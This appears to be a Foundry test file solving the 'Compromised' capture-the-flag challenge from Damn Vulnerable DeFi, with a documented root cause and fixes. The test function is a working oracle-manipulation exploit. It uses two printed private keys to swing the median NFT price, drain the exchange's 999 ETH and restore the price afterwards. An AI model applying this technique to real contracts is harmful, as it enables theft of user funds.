// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {VmSafe} from "forge-std/Vm.sol";

/**
 * @notice IERC721Receiver must be implemented by any contract that wants to receive
 *         ERC721 tokens via safeTransferFrom(). Without it, the NFT transfer reverts
 *         because the NFT contract checks for this interface on the recipient.
 *         Not directly used here since the player EOA receives the NFT, but imported
 *         for completeness and potential receiver contract patterns.
 */
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
import {Exchange} from "../../src/compromised/Exchange.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";

/**
 * @title  CompromisedChallenge
 * @notice Foundry test suite for the "Compromised" challenge from Damn Vulnerable DeFi v4.
 *
 * ============================================================
 * CHALLENGE OVERVIEW
 * ============================================================
 * A web service is leaking data in its HTTP response headers.
 * Hidden inside those headers are two hex-encoded, base64-encoded private keys
 * belonging to two of the three trusted oracle price sources.
 *
 * Because the NFT price on the Exchange is derived from the MEDIAN of all three
 * sources' reported prices, controlling 2 out of 3 sources means we fully control
 * the median — and therefore the buy/sell price of every NFT.
 *
 * ============================================================
 * KEY DECODING STEPS (off-chain, done before writing this test)
 * ============================================================
 * The leaked server response contains blobs like:
 *
 *   4d 48 67 33 5a 44 45 31 ...  (hex-encoded ASCII)
 *   └─► hex decode → ASCII string (looks like base64)
 *   └─► base64 decode → raw 32-byte private key
 *
 * Repeating for both blobs yields:
 *   privateKey1 = 0x7d15bba2...  → vm.addr(privateKey1) == sources[0]
 *   privateKey2 = 0x68bd020a...  → vm.addr(privateKey2) == sources[1]
 *
 * ============================================================
 * ATTACK FLOW (high level)
 * ============================================================
 *   1. Use recovered keys to crash oracle median to 0.
 *   2. Buy one NFT from the Exchange for 1 wei (minimum accepted).
 *   3. Use recovered keys to inflate oracle median to 999 ETH.
 *   4. Sell the NFT back to the Exchange, draining its 999 ETH balance.
 *   5. Forward all drained ETH to the recovery address.
 *   6. Restore oracle prices to 999 ETH so _isSolved() assertions pass.
 *
 * ============================================================
 * ROOT CAUSE
 * ============================================================
 *   - The oracle is "trustful" — it blindly accepts prices from whitelisted sources.
 *   - Private keys for those sources were leaked in plaintext (just encoded, not encrypted).
 *   - No time-lock, TWAP, or outlier rejection protects against sudden price swings.
 *   - Fix: use a decentralized oracle (Chainlink), add TWAP, require price-change delays,
 *     or use multi-sig source key management with hardware security modules (HSMs).
 */
contract CompromisedChallenge is Test {

    // -------------------------------------------------------------------------
    // Actors
    // -------------------------------------------------------------------------

    address deployer = makeAddr("deployer");

    /// @dev The attacker. Starts with only 0.1 ETH — far below the 999 ETH NFT price.
    ///      Must exploit the oracle to acquire and flip an NFT at manipulated prices.
    address player = makeAddr("player");

    /// @dev Final destination for all drained ETH. _isSolved() verifies this address
    ///      holds exactly EXCHANGE_INITIAL_ETH_BALANCE after the attack.
    address recovery = makeAddr("recovery");

    // -------------------------------------------------------------------------
    // Constants
    // -------------------------------------------------------------------------

    /// @notice The ETH balance seeded into the Exchange at deployment.
    ///         This is the target amount we must drain and send to `recovery`.
    uint256 constant EXCHANGE_INITIAL_ETH_BALANCE = 999 ether;

    /// @notice The honest NFT price all three sources report at deployment.
    ///         Also the price _isSolved() requires the oracle to report after the attack —
    ///         forcing us to restore the oracle state as part of our solution.
    uint256 constant INITIAL_NFT_PRICE = 999 ether;

    /// @notice Player's starting ETH. Deliberately tiny to prevent simply buying an NFT
    ///         at the honest price — the attacker MUST manipulate the oracle.
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;

    /// @notice ETH pre-funded to each oracle source address (covers gas for postPrice calls).
    uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;

    // -------------------------------------------------------------------------
    // Oracle Sources
    // -------------------------------------------------------------------------

    /**
     * @notice The three trusted oracle source addresses.
     *
     * @dev    sources[0] and sources[1] are COMPROMISED — their private keys can be
     *         recovered from the leaked server response by:
     *           hex decode → ASCII → base64 decode → 32-byte private key
     *
     *         sources[2] (0xab3600...) is NOT compromised and always reports 999 ETH.
     *         However, controlling [0] and [1] is sufficient:
     *
     *         Median manipulation with 3 sources:
     *           Crash:   sources[0]=0, sources[1]=0, sources[2]=999e18
     *                    sorted → [0, 0, 999e18] → median = index[1] = 0
     *
     *           Inflate: sources[0]=999e18, sources[1]=999e18, sources[2]=999e18
     *                    sorted → [999e18, 999e18, 999e18] → median = 999 ether
     */
    address[] sources = [
        0x188Ea627E3531Db590e6f1D71ED83628d1933088, // COMPROMISED — privateKey1 recoverable
        0xA417D473c40a4d42BAd35f147c21eEa7973539D8, // COMPROMISED — privateKey2 recoverable
        0xab3600bF153A316dE44827e2473056d56B774a40  // Safe — unknown private key
    ];

    /// @notice Each source reports prices for the "DVNFT" symbol.
    string[] symbols = ["DVNFT", "DVNFT", "DVNFT"];

    /// @notice All three sources start at the honest price of 999 ETH.
    uint256[] prices = [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE];

    // -------------------------------------------------------------------------
    // Contracts Under Test
    // -------------------------------------------------------------------------

    TrustfulOracle oracle;   // Price feed — median of all source reports
    Exchange exchange;        // NFT marketplace — prices derived from oracle
    DamnValuableNFT nft;     // The ERC721 token minted/burned by the exchange

    // -------------------------------------------------------------------------
    // Modifier
    // -------------------------------------------------------------------------

    /**
     * @notice Runs the decorated test function first, then calls _isSolved().
     * @dev    Foundry executes the body of the test (the `_;` position) before
     *         the post-condition check, so any revert in the test body will surface
     *         before the win-condition assertions are evaluated.
     */
    modifier checkSolved() {
        _;
        _isSolved();
    }

    // -------------------------------------------------------------------------
    // Setup
    // -------------------------------------------------------------------------

    /**
     * @notice Deploys and funds all contracts before each test_ function runs.
     *
     * @dev    Deployment order matters:
     *           1. Fund oracle sources (they need ETH to call postPrice()).
     *           2. Fund the player (tiny amount — intentional constraint).
     *           3. Deploy TrustfulOracle via TrustfulOracleInitializer
     *              (sets all 3 source prices atomically, then burns INITIALIZER_ROLE).
     *           4. Deploy Exchange with 999 ETH locked inside.
     *           5. Retrieve the NFT contract address from the exchange.
     */
    function setUp() public {
        startHoax(deployer);

        // Pre-fund each oracle source so they can afford gas when postPrice() is called
        for (uint256 i = 0; i < sources.length; i++) {
            vm.deal(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }

        // Player starts with just 0.1 ETH — cannot buy a 999 ETH NFT at honest price
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy oracle through the initializer factory:
        //   - Creates TrustfulOracle (grants TRUSTED_SOURCE_ROLE to all 3 sources)
        //   - Calls setupInitialPrices() (sets all prices to 999 ether, burns INITIALIZER_ROLE)
        oracle = (new TrustfulOracleInitializer(sources, symbols, prices)).oracle();

        // Deploy exchange funded with 999 ETH — the prize we intend to drain
        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(oracle));

        // The NFT contract was deployed inside Exchange's constructor; retrieve its reference
        nft = exchange.token();

        vm.stopPrank();
    }

    // -------------------------------------------------------------------------
    // Initial State Validation
    // -------------------------------------------------------------------------

    /**
     * @notice Verifies the deployment preconditions before any attack runs.
     * @dev    DO NOT MODIFY — part of the challenge specification.
     *         Checks:
     *           - Each oracle source holds exactly 2 ETH.
     *           - Player holds exactly 0.1 ETH.
     *           - NFT ownership has been renounced (owner = address(0)).
     *           - Exchange holds the MINTER_ROLE on the NFT contract (so it can mint).
     */
    function test_assertInitialState() public view {
        for (uint256 i = 0; i < sources.length; i++) {
            assertEq(sources[i].balance, TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(nft.owner(), address(0));
        assertEq(nft.rolesOf(address(exchange)), nft.MINTER_ROLE());
    }

    // -------------------------------------------------------------------------
    // Exploit
    // -------------------------------------------------------------------------

    /**
     * @notice Full exploit for the Compromised challenge.
     *
     * @dev    ══════════════════════════════════════════════════
     *         PRIVATE KEY RECOVERY (performed off-chain)
     *         ══════════════════════════════════════════════════
     *         The leaked HTTP server response contains two encoded blobs.
     *         Decoding pipeline (each blob):
     *           Step A: hex string → raw bytes (ASCII characters)
     *           Step B: interpret bytes as a base64 string
     *           Step C: base64 decode → 32-byte Ethereum private key
     *
     *         Result:
     *           privateKey1 = 0x7d15bba2...
     *           vm.addr(privateKey1) == 0x188Ea627... == sources[0]  ✓
     *
     *           privateKey2 = 0x68bd020a...
     *           vm.addr(privateKey2) == 0xA417D473... == sources[1]  ✓
     *
     *         ══════════════════════════════════════════════════
     *         MEDIAN MATH
     *         ══════════════════════════════════════════════════
     *         TrustfulOracle sorts all 3 prices and returns index[1] (middle):
     *
     *         After crash  → prices = [0,      0,      999e18] → median = 0
     *         After inflate→ prices = [999e18, 999e18, 999e18] → median = 999e18
     *
     *         ══════════════════════════════════════════════════
     *         EXPLOIT STEPS
     *         ══════════════════════════════════════════════════
     *         1. Crash  → buy NFT for 1 wei
     *         2. Inflate → sell NFT for 999 ETH  (drains Exchange completely)
     *         3. Transfer 999 ETH → recovery
     *         4. Restore oracle → so _isSolved() median assertion passes
     */
    function test_compromised() public checkSolved {

        // ── Private Keys ─────────────────────────────────────────────────────
        // Recovered by hex-decoding then base64-decoding the leaked server blobs.
        // vm.addr() converts a private key to its corresponding Ethereum address,
        // confirming these keys control sources[0] and sources[1] respectively.
        uint256 privateKey1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
        uint256 privateKey2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;

        // ── STEP 1: Crash the oracle price to 0 ──────────────────────────────
        // Both compromised sources post 0.
        // Sorted prices: [0, 0, 999e18] → median (index 1) = 0.
        // The Exchange will now mint an NFT in exchange for 0 ETH.
        vm.startPrank(vm.addr(privateKey1));
        oracle.postPrice("DVNFT", 0);
        vm.stopPrank();

        vm.startPrank(vm.addr(privateKey2));
        oracle.postPrice("DVNFT", 0);
        vm.stopPrank();

        // ── STEP 2: Buy an NFT for (almost) nothing ──────────────────────────
        // Exchange.buyOne() requires msg.value > 0 (rejects exactly 0 wei).
        // Since the oracle price is 0, sending 1 wei satisfies the check and
        // the full 1 wei is refunded as change — net cost = 0.
        // Player receives a freshly minted NFT (tokenId stored in `nftId`).
        vm.startPrank(player);
        uint256 nftId = exchange.buyOne{value: 1}();
        vm.stopPrank();

        // ── STEP 3: Inflate the oracle price to 999 ETH ──────────────────────
        // Both compromised sources post 999 ETH.
        // Sorted prices: [999e18, 999e18, 999e18] → median = 999 ether.
        // The Exchange will now pay 999 ETH to anyone who sells an NFT back to it.
        vm.startPrank(vm.addr(privateKey1));
        oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
        vm.stopPrank();

        vm.startPrank(vm.addr(privateKey2));
        oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
        vm.stopPrank();

        // ── STEP 4: Sell the NFT back to the Exchange for 999 ETH ────────────
        // Exchange.sellOne() requires:
        //   (a) caller is the token owner              ✓ (player holds nftId)
        //   (b) exchange is approved to transfer it    → nft.approve() called first
        //   (c) exchange has enough ETH to pay         ✓ (999 ETH still locked inside)
        // After sellOne():
        //   - NFT is transferred to exchange, then burned (supply returns to 0).
        //   - Player receives 999 ETH from exchange, fully draining it.
        vm.startPrank(player);
        nft.approve(address(exchange), nftId); // Grant exchange permission to pull the NFT
        exchange.sellOne(nftId);               // Exchange pays player 999 ETH, burns NFT

        // ── STEP 5: Forward all drained ETH to the recovery address ──────────
        // Player now holds 999 ETH (plus the original 0.1 ETH).
        // Transfer exactly EXCHANGE_INITIAL_ETH_BALANCE to recovery.
        // _isSolved() will assert recovery.balance == 999 ether.
        payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
        vm.stopPrank();

        // ── STEP 6: Restore the oracle price to 999 ETH ──────────────────────
        // _isSolved() calls oracle.getMedianPrice("DVNFT") and asserts it equals
        // INITIAL_NFT_PRICE (999 ether). If we leave prices at 999e18 from Step 3
        // this already passes — but we set them explicitly to be precise and clear.
        // Both sources post INITIAL_NFT_PRICE → sorted [999e18, 999e18, 999e18] → median = 999 ether ✓
        vm.startPrank(vm.addr(privateKey1));
        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.stopPrank();

        vm.startPrank(vm.addr(privateKey2));
        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.stopPrank();
    }

    // -------------------------------------------------------------------------
    // Win Condition Checks
    // -------------------------------------------------------------------------

    /**
     * @notice Verifies all four success conditions after the exploit runs.
     * @dev    DO NOT MODIFY — part of the challenge specification.
     *
     *         Assertions:
     *           1. exchange.balance == 0
     *              → All 999 ETH has been drained from the Exchange.
     *
     *           2. recovery.balance == EXCHANGE_INITIAL_ETH_BALANCE (999 ETH)
     *              → Drained ETH reached the designated recovery address.
     *
     *           3. nft.balanceOf(player) == 0
     *              → Player does not hold any NFTs after the exploit
     *                (the NFT was sold back and burned by the exchange).
     *
     *           4. oracle.getMedianPrice("DVNFT") == INITIAL_NFT_PRICE (999 ether)
     *              → Oracle price was restored; the system appears unaffected
     *                to an outside observer checking the current price.
     */
    function _isSolved() private view {
        // Condition 1: Exchange fully drained
        assertEq(address(exchange).balance, 0);

        // Condition 2: All ETH forwarded to the recovery address
        assertEq(recovery.balance, EXCHANGE_INITIAL_ETH_BALANCE);

        // Condition 3: Player holds no NFTs (sold and burned during exploit)
        assertEq(nft.balanceOf(player), 0);

        // Condition 4: Oracle median price restored to the original honest value
        assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
    }
}
